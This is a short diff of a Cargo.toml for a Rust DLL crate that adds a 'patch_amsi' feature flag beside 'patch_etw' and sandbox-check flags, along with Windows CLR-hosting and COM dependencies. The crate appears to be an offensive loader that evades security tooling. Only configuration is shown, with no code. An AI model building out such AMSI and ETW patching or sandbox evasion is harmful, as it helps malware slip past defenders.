@@ -30,6 +30,7 @@ crate-type = ["cdylib"]
 sandbox_trig = []
 sandbox_mem = []
 patch_etw = []
+patch_amsi = []
 
 [dependencies]
 minreq = { version="2.13", features = [
@@ -59,6 +60,7 @@ windows-sys = {version = "0.61", features = [
     "Win32_System_Ole",
     "Win32_System_Variant",
     "Win32_System_ClrHosting",
+    "Win32_System_Com",
 ]}
 rand = "0.9"
 windows-registry = "0.6"
